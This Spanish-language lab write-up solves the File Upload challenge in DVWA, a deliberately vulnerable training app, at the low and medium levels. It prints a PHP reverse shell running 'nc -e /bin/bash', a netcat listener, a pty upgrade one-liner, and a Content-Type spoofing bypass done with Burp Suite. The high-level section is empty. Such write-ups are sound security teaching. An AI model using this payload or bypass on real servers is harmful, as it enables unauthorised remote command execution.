# FU

Las vulnerabilidades de subida de archivos se producen cuando un servidor web permite a los usuarios subir archivos a su sistema de archivos sin validar suficientemente aspectos como su nombre, tipo, contenido o tamaño.

## Bajo

Para realizar este nivel, primero debemos acceder a la página de subida de archivos, para ello accedemos a la página principal de DVWA y pulsamos en `File Upload`. Una vez en la página de subida de archivos, podemos observar que el servidor web permite subir archivos de cualquier tipo, por lo que podemos subir la reverse shell que hemos creado en el nivel de `File Inclusion`.

```php
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

Una vez subida la shell, podemos comprobar como se ha subido correctamente.

![fileUploadedLow](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/fileUploadedLow.png)

A continuación, buscamos donde se ha subido el archivo  que según nos indica la respuesta del servidor es:

![fileIndexLow](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/fileIndexLow.png)

Ahora, podemos crear una escucha en el puerto 4000 para recibir la conexión de la reverse shell y  a continuación accedemos a la URL de la shell que hemos subido para ejecutarla.

```bash
nc -lvnp 4000
```

Una vez se establece la conexión, podemos comprobar que tenemos acceso al sistema.
Si se quiere, se puede hacer un upgrade a una shell interactiva con el comando: 

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

En la siguiente imagen podemos observar como hemos obtenido una shell interactiva y hemos podido ejecutar el comando `id` para comprobar que somos el usuario `www-data`.
![challenge-1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/challenge-1.png)

## Medio

Al contrario que en el nivel bajo, en este nivel el servidor web solo permite subir archivos de tipo `jpeg` o `png`, por lo que no podemos replicar la mecanica del nivel anterior.

![error](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/error.png)

Para poder subir la shell, debemos cambiar el tipo de archivo a `jpeg` o `png` y para ello podemos utilizar Burp Suite para interceptar la petición y modificar la cabecera `Content-Type` de la petición para que sea `image/jpeg` o `image/png`.

![intercept](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/intercept.png)

 Una vez interceptada la petición y modificada la cabecera, podemos enviar la petición y comprobar que se ha subido correctamente.

![intercept](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/intercept.png)

Al igual que en el nivel anterior, podemos observar como se ha obtenido una shell interactiva y hemos podido ejecutar el comando `id` para comprobar que somos el usuario `www-data`.
![challenge-1](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/challenge-1.png)

## Alto